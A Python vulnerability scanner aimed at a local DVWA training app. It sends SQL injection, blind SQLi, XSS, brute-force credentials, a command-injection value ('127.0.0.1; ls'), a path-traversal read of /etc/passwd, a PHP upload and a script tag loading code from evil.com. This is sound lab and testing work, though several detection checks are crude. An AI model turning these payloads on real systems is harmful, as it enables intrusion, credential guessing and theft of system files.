import requests
from bs4 import BeautifulSoup
import logging
import time
import re
import os

# Setup logging
logging.basicConfig(filename='vuln_scan.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# DVWA base URL and session setup
BASE_URL = 'http://localhost:8080'
COOKIES = {'security': 'low', 'PHPSESSID': 'SESS_ID'}  # Need to replace SESS_IP with PHPSESSID from DVWA app
TIMEOUT = 5

# Helper function to log and print results
def log_and_print_vuln(vuln_type, url, payload, status, response_text=None):
    if status:
        msg = f"[+] {vuln_type} DETECTED at {url} with payload: {payload}"
        if response_text:
            msg += f"\n    Response Snippet: {response_text[:100]}..."  # Limit to 100 chars
        print(msg)
        logging.info(f"{vuln_type} DETECTED at {url} with payload: {payload}")
    else:
        msg = f"[-] No {vuln_type} found at {url} with payload: {payload}"
        print(msg)
        logging.info(f"No {vuln_type} found at {url} with payload: {payload}")
# 1. SQL Injection
def test_sqli(url, payload):
    try:
        data = {'id': payload, 'Submit': 'Submit'}
        r = requests.get(url, params=data, cookies=COOKIES, timeout=TIMEOUT)
        if 'mysql' in r.text.lower() or 'syntax' in r.text.lower():
            log_and_print_vuln("SQL Injection", url, payload, True, r.text)
            return True
        log_and_print_vuln("SQL Injection", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"SQLi test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

# 2. SQL Injection (Blind)
def test_sqli_blind(url, payloads):
    try:
        for payload in payloads:
            data = {'id': payload, 'Submit': 'Submit'}
            start_time = time.time()
            r = requests.get(url, params=data, cookies=COOKIES, timeout=TIMEOUT)
            elapsed = time.time() - start_time
            if elapsed > 2:  # Assume delay > 2s indicates blind SQLi
                log_and_print_vuln("SQL Injection (Blind)", url, payload, True, f"Delay: {elapsed:.2f}s")
                return True
        log_and_print_vuln("SQL Injection (Blind)", url, payloads, False)
        return False
    except Exception as e:
        error_msg = f"Blind SQLi test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False
# 3. XSS (Stored)
def test_xss_stored(url, payload):
    try:
        data = {'txtName': payload, 'mtxMessage': 'test', 'btnSign': 'Sign Guestbook'}
        r = requests.post(url, data=data, cookies=COOKIES, timeout=TIMEOUT)
        r_verify = requests.get(url, cookies=COOKIES, timeout=TIMEOUT)
        if payload in r_verify.text:
            log_and_print_vuln("XSS (Stored)", url, payload, True, r_verify.text)
            return True
        log_and_print_vuln("XSS (Stored)", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"XSS Stored test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

# 4. XSS (Reflected)
def test_xss_reflected(url, payload):
    try:
        data = {'name': payload}
        r = requests.get(url, params=data, cookies=COOKIES, timeout=TIMEOUT)
        if payload in r.text:
            log_and_print_vuln("XSS (Reflected)", url, payload, True, r.text)
            return True
        log_and_print_vuln("XSS (Reflected)", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"XSS Reflected test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False
# 5. XSS (DOM)
def test_xss_dom(url, payload):
    try:
        r = requests.get(f"{url}#{payload}", cookies=COOKIES, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if payload.lower() in str(script).lower():
                log_and_print_vuln("XSS (DOM)", url, payload, True, str(script))
                return True
        log_and_print_vuln("XSS (DOM)", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"XSS DOM test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

# 6. Brute Force
def test_brute_force(url, usernames, passwords):
    try:
        for user in usernames[:2]:
            for pwd in passwords[:2]:
                data = {'username': user, 'password': pwd, 'Login': 'Login'}
                r = requests.post(url, data=data, cookies=COOKIES, timeout=TIMEOUT)
                if 'Welcome' in r.text or 'Login failed' not in r.text:
                    payload = f"{user}:{pwd}"
                    log_and_print_vuln("Brute Force", url, payload, True, r.text)
                    return True
        log_and_print_vuln("Brute Force", url, f"Lists: {usernames[:2]}, {passwords[:2]}", False)
        return False
    except Exception as e:
        error_msg = f"Brute Force test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False
# 7. Command Injection
def test_command_injection(url, payload):
    try:
        data = {'ip': payload, 'Submit': 'Submit'}
        r = requests.post(url, data=data, cookies=COOKIES, timeout=TIMEOUT)
        if 'dir' in r.text.lower() or 'ls' in r.text.lower():
            log_and_print_vuln("Command Injection", url, payload, True, r.text)
            return True
        log_and_print_vuln("Command Injection", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"Command Injection test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

# 8. CSRF
def test_csrf(url, payload):
    try:
        r = requests.get(url, cookies=COOKIES, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, 'html.parser')
        if not soup.find('input', {'name': re.compile('csrf|token', re.I)}):
            log_and_print_vuln("CSRF", url, "No token check", True, "No CSRF token found in form")
            return True
        log_and_print_vuln("CSRF", url, "No token check", False)
        return False
    except Exception as e:
        error_msg = f"CSRF test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False
# 9. File Inclusion
def test_file_inclusion(url, payload):
    try:
        data = {'page': payload}
        r = requests.get(url, params=data, cookies=COOKIES, timeout=TIMEOUT)
        if 'root:x:' in r.text or 'etc/passwd' in r.text:
            log_and_print_vuln("File Inclusion", url, payload, True, r.text)
            return True
        log_and_print_vuln("File Inclusion", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"File Inclusion test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

# 10. File Upload
def test_file_upload(url, payload_file):
    try:
        files = {'uploaded': (payload_file, open(payload_file, 'rb'), 'text/php')}
        data = {'MAX_FILE_SIZE': '10000', 'Upload': 'Upload'}
        r = requests.post(url, files=files, data=data, cookies=COOKIES, timeout=TIMEOUT)
        if 'uploaded' in r.text.lower() and 'php' in r.text.lower():
            log_and_print_vuln("File Upload", url, payload_file, True, r.text)
            return True
        log_and_print_vuln("File Upload", url, payload_file, False)
        return False
    except Exception as e:
        error_msg = f"File Upload test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False
# 11. Insecure CAPTCHA
def test_insecure_captcha(url, payload):
    try:
        data = {'g-recaptcha-response': payload, 'Submit': 'Submit'}
        r = requests.post(url, data=data, cookies=COOKIES, timeout=TIMEOUT)
        if 'CAPTCHA passed' in r.text or 'success' in r.text.lower():
            log_and_print_vuln("Insecure CAPTCHA", url, payload, True, r.text)
            return True
        log_and_print_vuln("Insecure CAPTCHA", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"Insecure CAPTCHA test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

# 12. Weak Session IDs
def test_weak_session_ids(url):
    try:
        r1 = requests.get(url, cookies={'security': 'low'}, timeout=TIMEOUT)
        cookie1 = r1.cookies.get('PHPSESSID')
        r2 = requests.get(url, cookies={'security': 'low'}, timeout=TIMEOUT)
        cookie2 = r2.cookies.get('PHPSESSID')
        if cookie1 == cookie2 or not cookie1:
            log_and_print_vuln("Weak Session IDs", url, "Session check", True, f"Session IDs: {cookie1}, {cookie2}")
            return True
        log_and_print_vuln("Weak Session IDs", url, "Session check", False)
        return False
    except Exception as e:
        error_msg = f"Weak Session IDs test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

# 13. CSP Bypass
def test_csp_bypass(url, payload):
    try:
        data = {'input': payload}
        r = requests.post(url, data=data, cookies=COOKIES, timeout=TIMEOUT)
        if payload in r.text and 'Content-Security-Policy' not in r.headers:
            log_and_print_vuln("CSP Bypass", url, payload, True, r.text)
            return True
        log_and_print_vuln("CSP Bypass", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"CSP Bypass test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

# 14. JavaScript Injection
def test_javascript_injection(url, payload):
    try:
        data = {'input': payload}
        r = requests.post(url, data=data, cookies=COOKIES, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if payload.lower() in str(script).lower():
                log_and_print_vuln("JavaScript Injection", url, payload, True, str(script))
                return True
        log_and_print_vuln("JavaScript Injection", url, payload, False)
        return False
    except Exception as e:
        error_msg = f"JavaScript Injection test failed at {url}: {e}"
        print(f"[!] {error_msg}")
        logging.error(error_msg)
        return False

def main():
    # URLs for DVWA vulnerabilities
    urls = {
        'sqli': f'{BASE_URL}/vulnerabilities/sqli/',
        'sqli_blind': f'{BASE_URL}/vulnerabilities/sqli_blind/',
        'xss_stored': f'{BASE_URL}/vulnerabilities/xss_s/',
        'xss_reflected': f'{BASE_URL}/vulnerabilities/xss_r/',
        'xss_dom': f'{BASE_URL}/vulnerabilities/xss_d/',
        'brute_force': f'{BASE_URL}/vulnerabilities/brute/',
        'command_injection': f'{BASE_URL}/vulnerabilities/exec/',
        'csrf': f'{BASE_URL}/vulnerabilities/csrf/',
        'file_inclusion': f'{BASE_URL}/vulnerabilities/fi/',
        'file_upload': f'{BASE_URL}/vulnerabilities/upload/',
        'captcha': f'{BASE_URL}/vulnerabilities/captcha/',
        'session_id': f'{BASE_URL}/login.php',
        'csp_bypass': f'{BASE_URL}/vulnerabilities/csp/',
        'javascript': f'{BASE_URL}/vulnerabilities/javascript/'
    }

    # Payloads
    payloads = {
        'sqli': "' OR '1'='1",
        'sqli_blind': ["1' AND SLEEP(3)--", "1' AND IF(1=1, SLEEP(3), 0)--"],
        'xss_stored': "<script>alert('XSS')</script>",
        'xss_reflected': "<img src=x onerror=alert('XSS')>",
        'xss_dom': "defaultValue=alert('XSS')",
        'brute_force': (['admin', 'user'], ['password', 'admin123']),
        'command_injection': "127.0.0.1; ls",
        'csrf': "",  # CSRF checks for token absence
        'file_inclusion': "../../../../../../etc/passwd",
        'file_upload': "test.php",
        'captcha': "bypass",
        'session_id': "",
        'csp_bypass': "<script src='http://evil.com/mal.js'></script>",
        'javascript': "alert('Injected JS')",
    }

    # Run tests
    print("Starting Vulnerability Scan...\n")
    logging.info("=== Vulnerability Scan Started ===")

    test_sqli(urls['sqli'], payloads['sqli'])
    test_sqli_blind(urls['sqli_blind'], payloads['sqli_blind'])
    test_xss_stored(urls['xss_stored'], payloads['xss_stored'])
    test_xss_reflected(urls['xss_reflected'], payloads['xss_reflected'])
    test_xss_dom(urls['xss_dom'], payloads['xss_dom'])
    test_brute_force(urls['brute_force'], *payloads['brute_force'])
    test_command_injection(urls['command_injection'], payloads['command_injection'])
    test_csrf(urls['csrf'], payloads['csrf'])
    test_file_inclusion(urls['file_inclusion'], payloads['file_inclusion'])
    test_file_upload(urls['file_upload'], payloads['file_upload'])
    test_insecure_captcha(urls['captcha'], payloads['captcha'])
    test_weak_session_ids(urls['session_id'])
    test_csp_bypass(urls['csp_bypass'], payloads['csp_bypass'])
    test_javascript_injection(urls['javascript'], payloads['javascript'])

    print("\nScan complete. Check vuln_scan.log for full details.")
    logging.info("=== Vulnerability Scan Ended ===")

if __name__ == "__main__":
    # Created test.php for file upload test
    if not os.path.exists('test.php'):
        with open('test.php', 'w') as f:
            f.write('<?php phpinfo(); ?>')
    main()
